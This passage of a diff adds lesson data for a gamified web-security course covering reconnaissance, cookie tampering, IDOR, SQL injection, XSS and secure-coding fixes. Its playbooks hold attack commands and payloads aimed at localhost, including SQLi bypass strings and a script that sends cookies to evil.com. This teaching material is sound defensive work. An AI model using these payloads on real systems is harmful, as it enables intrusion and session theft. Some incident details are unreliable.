+        playbook: `
+          Professional web reconnaissance methodology:
+          <pre><code># Check for robots.txt and sitemap.xml:
+curl -s http://127.0.0.1:8080/robots.txt
+
+# Automated directory brute-forcing using ffuf or gobuster:
+ffuf -w /usr/share/wordlists/dirb/common.txt -u http://127.0.0.1:8080/FUZZ
+
+# Check for sensitive exposed environment files:
+curl -I http://127.0.0.1:8080/.env</code></pre>
+        `,
+        defense: `
+          <strong>Secure Document Root Hygiene:</strong>
+          Configure web servers (Nginx/Apache) to explicitly deny access to hidden dotfiles (<code>location ~ /\\. { deny all; }</code>) 
+          and keep development files, Git repositories, and documentation completely outside the web server's public document root.
+        `,
+        question: 'Why should a security engineer NEVER rely on robots.txt as an access control mechanism?'
+      },
+      {
+        id: 'web-devtools',
+        title: '2.2 Browser DevTools: Peeking Behind the Canvas',
+        slug: 'web-devtools',
+        concept: 'Client-Side Transparency & Source Inspection',
+        incident: 'In 2021, an Australian state government website was discovered storing encrypted voter verification keys and validation algorithms directly in client-side HTML source comments.',
+        lecture: `
+          When you look at a website, you are seeing a rendered digital painting. But if you press <code>F12</code> or right-click and select <strong>Inspect</strong>, 
+          the curtain is pulled back. You are looking at the raw architectural blueprint: the HTML DOM tree, stylesheet rules, JavaScript bundles, 
+          network calls, and browser storage.
+        `,
+        underTheHood: `
+          Many novice developers mistakenly believe that if an element is hidden on the screen (using CSS <code>display: none</code> or an HTML <code>&lt;input type="hidden"&gt;</code>), 
+          it is secure from the user. 
+          <br><br>
+          This is completely false. The browser is the user's computer. Every line of HTML, CSS, JavaScript, and developer comment downloaded by the browser 
+          can be read, modified, paused, and rewritten in memory using the browser's JavaScript console and debugger.
+        `,
+        playbook: `
+          Using DevTools like an application security researcher:
+          <ul>
+            <li><strong>Elements Tab:</strong> Search the DOM tree (<code>Ctrl+F</code>) for keywords like <code>flag</code>, <code>secret</code>, <code>admin</code>, or HTML comments (<code>&lt;!-- --&gt;</code>).</li>
+            <li><strong>Sources Tab:</strong> Inspect client-side scripts, un-minify bundled code with the pretty-print <code>{}</code> button, and place breakpoints in authentication handlers.</li>
+            <li><strong>Console Tab:</strong> Directly query and inspect global JavaScript objects and API state (e.g., typing <code>window.__APP_STATE__</code>).</li>
+          </ul>
+        `,
+        defense: `
+          <strong>Client-Side Security Principle:</strong>
+          Never write sensitive credentials, internal network paths, or business-critical validation logic into client-side code. 
+          Assume that every single character delivered to the browser will be scrutinized by an adversary.
+        `,
+        question: 'If a web application disables right-clicking and the F12 key using JavaScript, does that stop a security auditor from inspecting the source code?'
+      },
+      {
+        id: 'web-cookie-trust',
+        title: '2.3 Cookies & Sessions: Tamper-Evident Wristbands',
+        slug: 'web-cookie-trust',
+        concept: 'Session Management, State Tracking & Cookie Tampering',
+        incident: 'Early e-commerce platforms allowed users to purchase items for free by tampering with client-side cookies that stored shopping cart totals (e.g. cookie: cart_total=0.01).',
+        lecture: `
+          Because HTTP is a <strong>stateless</strong> protocol, the server forgets who you are the millisecond it finishes sending a response. 
+          To maintain a login session, the server issues your browser a small token called a <strong>Cookie</strong>.
+          <br><br>
+          <div class="callout analogy">
+            <strong>The Waterpark Wristband Analogy:</strong>
+            When you enter an amusement park, the ticket office checks your ID and straps a colored paper wristband onto your arm. 
+            Throughout the day, when you get in line for rollercoasters, the ride operators do not re-verify your driver's license; they glance at your wristband. 
+            If the wristband is made of ordinary paper and you write "VIP ACCESS" on it with a ballpoint pen, and the attendants let you into the VIP lounge, 
+            the park has a <strong>cookie trust flaw</strong>.
+          </div>
+        `,
+        underTheHood: `
+          When you authenticate, the server transmits a header: <code>Set-Cookie: role=user; Path=/</code>.
+          On every subsequent click, your browser automatically includes: <code>Cookie: role=user</code>.
+          <br><br>
+          If the server naively trusts this string without verifying a cryptographic signature (HMAC) or checking a database session record, 
+          an attacker can simply open DevTools Application/Storage tab, change <code>role=user</code> to <code>role=admin</code>, and refresh the page to gain administrative privileges!
+        `,
+        playbook: `
+          Testing and manipulating cookies:
+          <pre><code># Send an HTTP request with a modified cookie using curl:
+curl -H "Cookie: role=admin; verified=true" http://127.0.0.1:8080/dashboard
+
+# Decode Base64 or URL-encoded cookie values:
+echo "eyJyb2xlIjoidXNlciJ9" | base64 -d</code></pre>
+        `,
+        defense: `
+          <strong>Secure Session Engineering:</strong>
+          <ul>
+            <li>Store only random, unguessable cryptographic session IDs (e.g., 128-bit UUIDs) in cookies. Store all permissions, roles, and user data securely in server-side databases (Redis/Postgres).</li>
+            <li>If using client-side tokens (like JWTs), digitally sign them with robust algorithms (HMAC SHA-256) and strong, unpredictable secret keys.</li>
+            <li>Always set the <code>HttpOnly</code> flag (prevents XSS theft) and the <code>Secure</code> flag (prevents transmission over unencrypted HTTP).</li>
+          </ul>
+        `,
+        question: 'What is the purpose of the HttpOnly flag on cookies, and what attack vector does it mitigate?'
+      },
+      {
+        id: 'web-client-trust',
+        title: '2.4 The Myth of Client-Side Validation: Never Trust the Browser',
+        slug: 'web-client-trust',
+        concept: 'Input Validation Boundaries & Direct HTTP Request Crafting',
+        incident: 'Multiple high-profile retail breaches occurred when attackers bypassed HTML checkout forms to submit negative quantities (e.g. quantity: -5), tricking billing gateways into refunding money.',
+        lecture: `
+          When you fill out a form on the web and type an invalid email, the box glows red and says <em>"Please enter a valid email address."</em> 
+          The submit button remains disabled until you fill out every required field.
+          <br><br>
+          This is <strong>Client-Side Validation</strong>. It is wonderful for user experience because it provides instant feedback without waiting for a slow network call. 
+          <strong>However, it is NOT a security boundary!</strong>
+        `,
+        underTheHood: `
+          Client-side validation is executed entirely in JavaScript on the user's computer. 
+          An attacker does not have to use your web page form! They can open a terminal, launch <code>curl</code>, Postman, or Burp Suite, 
+          and transmit any raw HTTP POST payload they desire directly to your server's API endpoint, completely bypassing all HTML <code>required</code>, <code>maxlength</code>, and JavaScript validation checks.
+        `,
+        playbook: `
+          Bypassing disabled client-side buttons and limits:
+          <pre><code># Inspect the form action URL and input names in DevTools.
+# Submit the request directly using curl with arbitrary or out-of-bounds values:
+curl -X POST http://127.0.0.1:8080/api/purchase \\
+  -H "Content-Type: application/json" \\
+  -d '{"itemId": 42, "quantity": -10, "discountCode": "FREE99"}'</code></pre>
+        `,
+        defense: `
+          <strong>Authoritative Server-Side Validation:</strong>
+          Every input must be rigorously validated and sanitized on the server before processing:
+          <pre><code>// Example server validation using Zod in Node.js:
+const PurchaseSchema = z.object({
+  itemId: z.number().int().positive(),
+  quantity: z.number().int().min(1).max(100),
+});
+const validatedData = PurchaseSchema.parse(req.body);</code></pre>
+        `,
+        question: 'Why do developers implement client-side validation if it provides zero actual security against malicious actors?'
+      },
+      {
+        id: 'web-idor',
+        title: '2.5 Insecure Direct Object References: Peeking into Other Lockers',
+        slug: 'web-idor',
+        concept: 'Broken Object-Level Authorization (BOLA / IDOR)',
+        incident: 'In 2019, real estate giant First American Financial exposed over 885 million sensitive mortgage and banking records because their portal allowed anyone to view arbitrary documents by changing the record ID number in the URL.',
+        lecture: `
+          Imagine visiting a bank where the safety deposit lockers have transparent glass doors, and the keys are replaced by simple numbers. 
+          The teller says: <em>"Your box is number 105."</em> You open box 105. 
+          Then you wonder: <em>"What happens if I turn the handle on box 106?"</em> 
+          You turn the handle, the door swings wide open, and you are staring at another customer's gold bullion.
+          <br><br>
+          That is an <strong>Insecure Direct Object Reference (IDOR)</strong>, currently ranked as the #1 threat in the OWASP API Security Top 10.
+        `,
+        underTheHood: `
+          When an application retrieves database objects using direct user-supplied identifiers (such as sequential database integers: <code>/api/invoice?id=105</code>) 
+          without verifying that the authenticated user actually owns that object, an attacker can simply increment the number (<code>id=106</code>, <code>id=107</code>) 
+          to harvest records belonging to every user in the database.
+        `,
+        playbook: `
+          Discovering and testing IDOR vulnerabilities:
+          <pre><code># Request your own profile:
+curl -H "Cookie: session=my_token" http://127.0.0.1:8080/api/profile?id=1042
+
+# Test horizontal privilege escalation by requesting adjacent IDs:
+curl -H "Cookie: session=my_token" http://127.0.0.1:8080/api/profile?id=1043
+curl -H "Cookie: session=my_token" http://127.0.0.1:8080/api/profile?id=1</code></pre>
+        `,
+        defense: `
+          <strong>Enforcing Contextual Authorization at the Data Layer:</strong>
+          Never query objects by direct ID alone. Always tie the query to the authenticated session identity:
+          <pre><code>// INSECURE:
+const invoice = await db.find({ id: req.params.id });
+
+// SECURE:
+const invoice = await db.find({ id: req.params.id, ownerId: req.session.userId });
+if (!invoice) return res.status(404).json({ error: 'Not found' });</code></pre>
+          Additionally, replace sequential integers with cryptographically random UUIDv4 identifiers.
+        `,
+        question: 'What is the distinction between Horizontal Privilege Escalation and Vertical Privilege Escalation in access control vulnerabilities?'
+      },
+      {
+        id: 'web-sqli',
+        title: '2.6 SQL Injection: Whispering Directly to the Database',
+        slug: 'web-sqli',
+        concept: 'Code-Data Separation Failure & Syntactic Escape',
+        incident: 'The 2015 TalkTalk breach cost the UK telecom company over £77 million and compromised 157,000 customers due to a simple SQL injection flaw executed by teenage script kiddies.',
+        lecture: `
+          Relational databases understand a powerful query language called <strong>SQL (Structured Query Language)</strong>.
+          <br><br>
+          <div class="callout analogy">
+            <strong>The Automated Warehouse Robot Metaphor:</strong>
+            Imagine an automated parts warehouse with a voice-activated robot. 
+            You speak into the microphone: <em>"Fetch part [PART_NUMBER]."</em> 
+            The robot runs the command: <code>FETCH PART WHERE ID = [YOUR_INPUT]</code>.
+            If you say <em>"123"</em>, it fetches part 123.
+            <br><br>
+            Now imagine you say: <em>"123 OR 1=1; AND UNLOCK ALL WAREHOUSE DOORS;"</em>
+            If the robot does not separate your speech from its operating instructions, it treats your malicious words as executive commands!
+          </div>
+        `,
+        underTheHood: `
+          SQL injection occurs when developers build database queries by concatenating raw strings:
+          <pre><code>// VULNERABLE CODE:
+const sql = "SELECT * FROM users WHERE username = '" + req.body.user + "' AND password = '" + req.body.pass + "'";</code></pre>
+          If an attacker submits the username: <code>admin' --</code>
+          The query string evaluates inside the database engine as:
+          <pre><code>SELECT * FROM users WHERE username = 'admin' --' AND password = '...';</code></pre>
+          In SQL, the sequence <code>--</code> indicates a comment! The database engine evaluates <code>username = 'admin'</code> and ignores everything after it, 
+          instantly granting administrator access without knowing the password!
+        `,
+        playbook: `
+          Detecting SQL Injection vulnerabilities:
+          <ul>
+            <li>Submit a single quote (<code>'</code>) or double quote (<code>"</code>). If the server responds with a database error (e.g., <code>SQLITE_ERROR: unrecognized token</code>), SQL injection is almost certainly present.</li>
+            <li>Authentication bypass test: <code>' OR '1'='1' --</code></li>
+            <li>Information extraction via UNION queries: <code>' UNION SELECT null, username, password FROM users --</code></li>
+          </ul>
+        `,
+        defense: `
+          <strong>Parameterized Queries (Prepared Statements):</strong>
+          Never concatenate strings to build SQL queries. Use parameterized placeholders:
+          <pre><code>// SECURE:
+const sql = "SELECT * FROM users WHERE username = ? AND password = ?";
+db.get(sql, [req.body.user, req.body.pass], (err, row) => { ... });</code></pre>
+          The database pre-compiles the query template first. When parameters arrive, they are treated strictly as literal data, making syntactic breakout mathematically impossible.
+        `,
+        question: 'How do Prepared Statements physically prevent SQL injection at the database engine parsing level?'
+      },
+      {
+        id: 'web-reflected-xss',
+        title: '2.7 Reflected Cross-Site Scripting: Tricking the Mirror',
+        slug: 'web-reflected-xss',
+        concept: 'Context-Unaware Output Reflection & Client-Side Execution',
+        incident: 'The Samy Worm on MySpace in 2005 used XSS to propagate across over one million user profiles in under 20 hours, taking down the entire social network.',
+        lecture: `
+          When you search for a term on a website, the page often greets you with: <em>"Search results for: [YOUR_TERM]."</em>
+          The website is acting like a digital mirror, reflecting your input back onto your screen.
+          <br><br>
+          If the application fails to encode dangerous characters before reflecting them, an attacker can craft a link containing malicious JavaScript. 
+          When an unsuspecting victim clicks the link, the victim's browser executes the script in the context of the trusted site!
+        `,
+        underTheHood: `
+          The browser interprets HTML sequentially. If a server responds with:
+          <pre><code>&lt;p&gt;Search results for: &lt;script&gt;fetch('https://evil.com/steal?cookie=' + document.cookie)&lt;/script&gt;&lt;/p&gt;</code></pre>
+          The browser cannot tell whether the <code>&lt;script&gt;</code> tag was written by the legitimate site developers or injected by an attacker. 
+          Because it arrived from <code>trustedbank.com</code>, the browser executes it with full access to the victim's session cookies and DOM!
+        `,
+        playbook: `
+          Testing for Reflected XSS:
+          <pre><code># Step 1: Probe with unique canary characters to check if they reflect unescaped:
+http://127.0.0.1:8080/search?q=test&lt;&gt;\"'
+
+# Step 2: Test script execution:
+http://127.0.0.1:8080/search?q=&lt;script&gt;alert(document.domain)&lt;/script&gt;
+
+# Step 3: Test HTML event handlers:
+http://127.0.0.1:8080/search?q=&lt;img src=x onerror=alert(1)&gt;</code></pre>
+        `,
+        defense: `
+          <strong>Context-Aware Output Encoding & CSP:</strong>
+          <ul>
+            <li>Convert dangerous characters into safe HTML entities before rendering:
+              <code>&lt;</code> -> <code>&amp;lt;</code>, 
+              <code>&gt;</code> -> <code>&amp;gt;</code>, 
+              <code>&quot;</code> -> <code>&amp;quot;</code>.
+            </li>
+            <li>Deploy a robust <strong>Content Security Policy (CSP)</strong> header: <code>Content-Security-Policy: default-src 'self'</code>, which blocks unauthorized inline scripts from executing.</li>
+          </ul>
+        `,
+        question: 'Why does Reflected XSS require social engineering (tricking a victim into clicking a link) while Stored XSS does not?'
+      },
+      {
+        id: 'web-headers',
+        title: '2.8 Security Headers & Defense in Depth: Fortifying the Perimeter',
+        slug: 'web-headers',
+        concept: 'HTTP Response Security Controls & Browser Policy Enforcement',
+        incident: 'Widespread clickjacking attacks against social media platforms and banking portals tricked users into clicking invisible iframes, silently transferring funds or authorizing account takeovers.',
+        lecture: `
+          Modern web browsers possess powerful built-in defensive shields. However, browsers are polite: they assume a website wants maximum flexibility unless the website explicitly instructs them to lock down their security features.
+          <br><br>
+          <strong>Security Headers</strong> are special response headers that act like executive orders from your server to the visitor's browser, commanding it to block framing, prevent MIME-type confusion, and enforce cryptographic connections.
+        `,
+        underTheHood: `
+          Essential HTTP security headers every web developer must understand:
+          <table>
+            <thead>
+              <tr>
+                <th>Header</th>
+                <th>Recommended Value</th>
+                <th>Attack Mitigated</th>
+              </tr>
+            </thead>
+            <tbody>
+              <tr>
+                <td><strong>Content-Security-Policy (CSP)</strong></td>
+                <td><code>default-src 'self'</code></td>
+                <td>Cross-Site Scripting (XSS) and data injection</td>
+              </tr>
+              <tr>
+                <td><strong>X-Frame-Options</strong></td>
+                <td><code>DENY</code> or <code>SAMEORIGIN</code></td>
+                <td>Clickjacking (embedding site in malicious iframe)</td>
+              </tr>
+              <tr>
+                <td><strong>X-Content-Type-Options</strong></td>
+                <td><code>nosniff</code></td>
+                <td>MIME-confusion attacks (forcing browser to treat image as script)</td>
+              </tr>
+              <tr>
+                <td><strong>Strict-Transport-Security (HSTS)</strong></td>
+                <td><code>max-age=31536000; includeSubDomains</code></td>
+                <td>SSL-stripping man-in-the-middle attacks</td>
+              </tr>
+            </tbody>
+          </table>
+        `,
+        playbook: `
+          Auditing HTTP security headers from the command line:
+          <pre><code># Fetch headers and inspect security directives:
+curl -I http://127.0.0.1:8080/
+
+# Test if a site can be framed by checking X-Frame-Options and CSP frame-ancestors:
+curl -s -I http://127.0.0.1:8080/ | grep -Ei "frame|csp|content-security"</code></pre>
+        `,
+        defense: `
+          <strong>Hardening Middleware in Code:</strong>
+          In Node.js/Express, implement the industry-standard <code>helmet</code> library:
+          <pre><code>import helmet from 'helmet';
+app.use(helmet());</code></pre>
+          In Nginx, include standardized security header blocks across all server configurations.
+        `,
+        question: 'How does the "nosniff" directive in X-Content-Type-Options prevent an attacker from executing malicious code uploaded as a benign .png avatar?'
+      },
+      {
+        id: 'web-stored-xss',
+        title: '2.9 Stored Cross-Site Scripting: Planting Traps on the Bulletin Board',
+        slug: 'web-stored-xss',
+        concept: 'Persistent Malicious Payloads in Databases',
+        incident: 'In 2014, a TweetDeck Stored XSS vulnerability allowed a tweet containing a self-replicating payload to automatically retweet itself and pop up alerts for thousands of users simultaneously.',
+        lecture: `
+          If Reflected XSS is like tricking someone into looking into a warped mirror, <strong>Stored XSS</strong> is like carving a venomous rune onto the town square bulletin board.
+          <br><br>
+          The attacker does not need to send links to victims. Instead, they submit a malicious payload into a database record (such as a public comment, profile username, or product review). 
+          Every single person who visits that page thereafter has the malicious script executed inside their browser automatically!
+        `,
+        underTheHood: `
+          The lifecycle of a Stored XSS attack:
+          <ol>
+            <li><strong>Injection:</strong> Attacker posts a comment: <code>&lt;script&gt;stealTokens()&lt;/script&gt;</code>.</li>
+            <li><strong>Persistence:</strong> The vulnerable backend saves the raw string into the database without validation.</li>
+            <li><strong>Delivery:</strong> An administrator visits the dashboard to review comments. The server reads the record from the database and inserts it unescaped into the HTML document.</li>
+            <li><strong>Execution:</strong> The administrator's browser executes the script, granting the attacker complete administrative control of the application!</li>
+          </ol>
+        `,
+        playbook: `
+          Auditing for Stored XSS:
+          <ul>
+            <li>Submit benign probe payloads: <code>&lt;b&gt;bold_test&lt;/b&gt;</code> or <code>&lt;img src=x onerror=console.log('stored_xss')&gt;</code> into user profile names, feedback forms, and comments.</li>
+            <li>Reload the page (or log in with a second user account) to observe whether the HTML rendered executed the probe.</li>
+          </ul>
+        `,
+        defense: `
+          <strong>Sanitization on Storage & Encoding on Render:</strong>
+          <ul>
+            <li>Sanitize incoming rich text using trusted, battle-tested libraries like <code>DOMPurify</code>.</li>
+            <li>Adopt modern UI frameworks (React, Vue, Angular) that automatically encode data-bound variables in templates (e.g., <code>&lt;div&gt;{userComment}&lt;/div&gt;</code>) by default.</li>
+            <li>Never use dangerous raw rendering APIs like <code>dangerouslySetInnerHTML</code> or <code>v-html</code> on unvalidated user input.</li>
+          </ul>
+        `,
+        question: 'Why is Stored XSS considered significantly more hazardous than Reflected XSS in enterprise risk scoring?'
+      },
+      {
+        id: 'web-chain',
+        title: '2.10 Chained Vulnerabilities: The Domino Effect',
+        slug: 'web-chain',
+        concept: 'Multi-Stage Vulnerability Chaining & Defense-in-Depth Failure',
+        incident: 'The vast majority of modern bug bounty critical payouts and real-world breaches do not rely on a single catastrophic zero-day, but on chaining 3 or 4 low-severity flaws into a complete system takeover.',
+        lecture: `
+          In isolation, a single minor vulnerability might seem harmless to an inexperienced developer: 
+          <em>"It's just an internal IP leak,"</em> or <em>"It's just an IDOR on a shopping cart total."</em>
+          <br><br>
+          However, professional penetration testers and real-world adversaries think in <strong>attack graphs</strong>. 
+          They line up minor weaknesses like a row of dominos. Toppling the first domino provides credentials for the second, 
+          which unlocks an internal API for the third, leading to full enterprise compromise.
+        `,
+        underTheHood: `
+          A classic vulnerability chain in modern web architecture:
+          <pre><code>[ Stage 1: Reconnaissance ]
+     Exposed /robots.txt reveals hidden /admin-staging endpoint.
+           |
+           v
+[ Stage 2: Insecure Direct Object Reference ]
+     /api/staging-logs?id=10 reveals developer debug tokens.
+           |
+           v
+[ Stage 3: Cross-Site Scripting / Token Theft ]
+     Stored XSS on feedback form executes debug token in Admin session.
+           |
+           v
+[ Full Compromise: Database Exfiltration & System Takeover ]</code></pre>
+        `,
+        playbook: `
+          How to think in attack chains:
+          <ul>
+            <li>Document every small anomaly discovered during reconnaissance.</li>
+            <li>Ask: <em>"What information does this low-severity finding provide that could be used as an input to another component?"</em></li>
+            <li>Combine access control oversights with authentication bypasses to escalate privilege.</li>
+          </ul>
+        `,
+        defense: `
+          <strong>True Defense in Depth:</strong>
+          Assume that your perimeter <em>will</em> be breached. Enforce zero trust authentication, rigorous audit logging, 
+          and least-privilege database roles at every internal microservice boundary so that the failure of one defensive layer does not topple the entire fortress.
+        `,
+        question: 'What is the "Swiss Cheese Model" of risk management, and how does it apply to application security defense in depth?'
+      }
+    ]
+  },
+  {
+    number: 3,
+    id: 'forge',
+    title: 'The Forge: Secure Coding & Defensive Architecture',
+    subtitle: 'From Pen-Tester to Master Craftsman: Building Software That Can Withstand an Earthquake',
+    introduction: `
+      <h3>The Teacher's Welcome to Defensive Engineering</h3>
+      <p>
+        Breaking things is easy. A toddler can knock down a tower of blocks in two seconds. 
+        Building a magnificent skyscraper that can survive category-5 hurricane winds and magnitude-8 earthquakes—that 
+        is the work of a master engineer.
+      </p>
+      <p>
+        Too much cybersecurity education focuses exclusively on the flashy offensive side: running automated exploits, 
+        collecting flags, and showing off broken systems. But the most valuable, highly respected engineers in technology 
+        are the <strong>defenders and builders</strong>.
+      </p>
+      <div class="callout analogy">
+        <strong>The Shipwright's Analogy:</strong>
+        A pirate learns where a ship's hull is thin so they can sink it. A master shipwright learns the physics of buoyancy, 
+        the grain of oak, the metallurgy of iron bolts, and the mathematics of compartmentalized bulkheads so they can build a ship 
+        that sails safely across the stormy Atlantic for forty years. 
+        <br><br>
+        <strong>In The Forge, you become the master shipwright.</strong>
+      </div>
+      <p>
+        In this final dungeon, you will inspect vulnerable production-grade Node.js code across all major vulnerability classes. 
+        You will not just find the bug; you will diagnose its mathematical root cause, craft the permanent architectural fix, 
+        and pass automated regression test harnesses that ensure the vulnerability can never return.
+      </p>
+    `,
+    challenges: [
+      {
+        id: 'secure-sqli',
+        title: '3.1 Defeating SQLi: Parameterized Queries & Prepared Statements',
+        slug: 'secure-sqli',
+        concept: 'Code-Data Segregation at the Driver Protocol Level',
+        incident: 'The 2008 Heartland Payment Systems breach compromised 134 million credit cards and cost $140 million due to a single unparameterized SQL statement in an ASP web application.',
+        lecture: `
+          In Dungeon 2, you learned that SQL injection happens when user input is concatenated directly into SQL query strings. 
+          How do we fix this permanently? 
+          <br><br>
+          Some developers attempt <strong>input blacklisting</strong> (removing quotes or the word 'OR'). 
+          <strong>Blacklists always fail!</strong> Attackers find alternate encodings, Unicode variations, or hex representations to bypass naive filters. 
+          The only true solution is architectural: <strong>Prepared Statements</strong>.
+        `,
+        underTheHood: `
+          In a prepared statement, query execution is split into two distinct, sequential phases:
+          <ol>
+            <li><strong>Compilation Phase:</strong> The database engine receives the query structure with placeholders: 
+              <code>SELECT * FROM users WHERE username = ?</code>. 
+              The engine parses the tokens, validates syntax, and compiles an execution plan. The structure of the query is now permanently locked in memory!
+            </li>
+            <li><strong>Execution Phase:</strong> The parameter values are transmitted over a separate binary channel. Even if the user submits <code>admin' OR 1=1 --</code>, the database treats that entire string as a literal username value. It never re-invokes the SQL parser!
+            </li>
+          </ol>
+        `,
+        playbook: `
+          Refactoring vulnerable database queries:
+          <pre><code>// ❌ VULNERABLE (String Concatenation):
+app.get('/api/search', (req, res) => {
+  const query = "SELECT * FROM products WHERE name = '" + req.query.q + "'";
+  db.all(query, (err, rows) => res.json(rows));
+});
+
+// ✅ SECURE (Parameterized Query):
+app.get('/api/search', (req, res) => {
+  const query = "SELECT * FROM products WHERE name = ?";
+  db.all(query, [req.query.q], (err, rows) => res.json(rows));
+});</code></pre>
+        `,
+        defense: `
+          <strong>Standardizing on Modern ORMs:</strong>
+          Modern database frameworks like Prisma, TypeORM, and Knex utilize parameterized queries by default. 
+          Never invoke raw SQL escape hatches (like <code>db.raw()</code>) unless parameterized bindings are explicitly provided.
+        `,
+        question: 'Why does sanitizing user input with regex replace(/\'/g, "\'\'") provide weaker guarantees than using prepared statements?'
+      },
+      {
+        id: 'secure-xss',
+        title: '3.2 Neutralizing XSS: Context-Aware Output Encoding & Sanitization',
+        slug: 'secure-xss',
+        concept: 'Context-Sensitive Output Encoding & Strict DOM Sanitization',
+        incident: 'The Yahoo email worm and PayPal XSS vulnerabilities both bypassed naive regex strip filters (&lt;script&gt;) using alternate HTML vector injection.',
+        lecture: `
+          Fixing Cross-Site Scripting requires understanding <strong>Context</strong>. 
+          Characters that are completely harmless in plain text become dangerous weapons when placed inside an HTML document, inside an attribute string, 
+          or inside an inline script block.
+          <br><br>
+          Just like SQL injection, trying to fix XSS by stripping the word <code>&lt;script&gt;</code> is doomed to fail. 
+          An attacker can simply use <code>&lt;img src=x onerror=...&gt;</code>, <code>&lt;svg onload=...&gt;</code>, or <code>&lt;iframe&gt;</code>.
+        `,
+        underTheHood: `
+          When user input must be rendered into an HTML document, it must undergo <strong>Contextual Output Encoding</strong>:
+          <pre><code>Original Character      Safe HTML Entity
+------------------      ----------------
+        &lt;                    &amp;lt;
+        &gt;                    &amp;gt;
+        &amp;                    &amp;amp;
+        "                    &amp;quot;
+        '                    &amp;#x27;</code></pre>
+          When the browser encounters <code>&amp;lt;script&amp;gt;</code>, the HTML tokenizer treats it strictly as display characters, printing the literal text on the screen rather than transitioning into script execution mode!
+        `,
+        playbook: `
+          Implementing secure escaping in Node.js:
+          <pre><code>// Safe HTML encoding function:
+function escapeHtml(str) {
+  return String(str)
+    .replace(/&/g, '&amp;')
+    .replace(/&lt;/g, '&lt;')
+    .replace(/&gt;/g, '&gt;')
+    .replace(/"/g, '&quot;')
+    .replace(/'/g, '&#x27;');
+}
+
+// Applying safe encoding before template rendering:
+app.get('/greeting', (req, res) => {
+  const safeName = escapeHtml(req.query.name || 'Cadet');
+  res.send(\`&lt;h1&gt;Welcome, \${safeName}!&lt;/h1&gt;\`);
+});</code></pre>
+        `,
+        defense: `
+          <strong>Modern UI Framework Protections:</strong>
+          React (<code>{variable}</code>) and Angular (<code>{{variable}}</code>) automatically apply contextual encoding to all rendered variables. 
+          Never bypass these safeguards by using <code>dangerouslySetInnerHTML</code>.
+        `,
+        question: 'Why does HTML entity encoding fail to prevent XSS if the untrusted variable is placed inside an inline &lt;script&gt; block or an href=\"javascript:...\" attribute?'
+      },
+      {
+        id: 'secure-idor',
+        title: '3.3 Enforcing Authorization: Taming IDOR at the Gate',
+        slug: 'secure-idor',
+        concept: 'Object-Level Authorization Enforcement & Tenant Isolation',
+        incident: 'The 2021 Panera Bread data leak exposed records of millions of loyalty card customers because customer profile endpoints checked that the requester was logged in, but never checked if the record requested belonged to them.',
+        lecture: `
+          There is a crucial distinction in cybersecurity between <strong>Authentication</strong> and <strong>Authorization</strong>:
+          <ul>
+            <li><strong>Authentication (AuthN):</strong> Proving <em>who you are</em> (e.g., logging in with your password).</li>
+            <li><strong>Authorization (AuthZ):</strong> Verifying <em>what you are allowed to do</em> (e.g., checking if you have permission to view file #42).</li>
+          </ul>
+          IDOR occurs when developers check authentication, but completely forget authorization!
+        `,
+        underTheHood: `
+          A secure authorization gate must occur on the server before database data is returned to the client:
+          <pre><code>Client Request: GET /api/orders/501
+   |
+   v
+[ Step 1: Authentication ] ---> Is the session token valid? (Yes, userId = 88)
+   |
+   v
+[ Step 2: Database Query ] ---> SELECT * FROM orders WHERE id = 501
+   |
+   v
+[ Step 3: Authorization Check ]
+   Does order.userId === 88?
+   - If YES: Return order data (200 OK)
+   - If NO: Return 403 Forbidden or 404 Not Found!</code></pre>
+        `,
+        playbook: `
+          Securing an Express route against IDOR:
+          <pre><code>app.get('/api/document/:id', async (req, res) => {
+  const docId = req.params.id;
+  const currentUserId = req.session.userId;
+
+  const doc = await db.getDocumentById(docId);
+  if (!doc) {
+    return res.status(404).json({ error: 'Document not found' });
+  }
+
+  // Explicit Object-Level Authorization Gate:
+  if (doc.ownerId !== currentUserId && req.session.role !== 'admin') {
+    return res.status(403).json({ error: 'Access denied: You do not own this document' });
+  }
+
+  return res.json(doc);
+});</code></pre>
+        `,
+        defense: `
+          <strong>Architectural Best Practices:</strong>
+          <ul>
+            <li>Enforce multi-tenant scoping in database repositories automatically: <code>db.orders.findMany({ where: { userId: currentUserId } })</code>.</li>
+            <li>Adopt Role-Based Access Control (RBAC) or Attribute-Based Access Control (ABAC) libraries like CASL.</li>
+          </ul>
+        `,
+        question: 'Why is returning HTTP 404 Not Found often considered more secure than returning HTTP 403 Forbidden when an unauthorized user attempts an IDOR request?'
+      },
+      {
+        id: 'secure-client',
+        title: '3.4 Never Trust the Client: Authoritative Server-Side Validation',
+        slug: 'secure-client',
+        concept: 'Defensive Input Sanitization & Boundary Integrity',
+        incident: 'Multiple cryptocurrency exchanges suffered millions in fraudulent withdrawals when attackers exploited floating point precision errors and negative withdrawal amounts on poorly validated API endpoints.',
+        lecture: `
+          In modern web development, frontend and backend teams are often separate. Frontend developers build gorgeous forms with slick sliders, 
+          dropdown menus, and JavaScript validation. 
+          <br><br>
+          Backend developers sometimes fall into the trap of assuming: <em>"The frontend won't let the user submit a negative price, so I don't need to check for it."</em>
+          <strong>This assumption has destroyed entire companies.</strong>
+        `,
+        underTheHood: `
+          Every input entering an API boundary must pass through strict whitelist validation:
+          <ul>
+            <li><strong>Type Validation:</strong> Is an integer actually an integer, or is it an array, object, or string?</li>
+            <li><strong>Range Checking:</strong> Are numerical quantities strictly greater than zero and within realistic business limits?</li>
+            <li><strong>Whitelist Verification:</strong> Are string options restricted exclusively to pre-approved enum sets?</li>
+          </ul>
+        `,
+        playbook: `
+          Refactoring an e-commerce checkout handler:
+          <pre><code>// ❌ VULNERABLE:
+app.post('/api/checkout', (req, res) => {
+  const total = req.body.price * req.body.quantity; // Negative quantity credits money!
+  processPayment(req.user, total);
+});
+
+// ✅ SECURE:
+app.post('/api/checkout', (req, res) => {
+  const { itemId, quantity } = req.body;
+
+  // Strict integer and range verification:
+  if (!Number.isInteger(quantity) || quantity &lt;= 0 || quantity &gt; 100) {
+    return res.status(400).json({ error: 'Invalid quantity' });
+  }
+
+  // Look up true price from authoritative database, NEVER from client request!
+  const item = db.getItem(itemId);
+  if (!item) return res.status(404).json({ error: 'Item not found' });
+
+  const total = item.price * quantity;
+  processPayment(req.user, total);
+});</code></pre>
+        `,
+        defense: `
+          <strong>Schema Validation Engines:</strong>
+          Implement robust schema validation middleware (such as Zod, Joi, or Yup) on all API endpoints. 
+          Reject any unexpected or unwhitelisted fields immediately.
+        `,
+        question: 'Why should item prices NEVER be accepted from the client request body during an e-commerce checkout transaction?'
+      },
+      {
+        id: 'secure-headers',
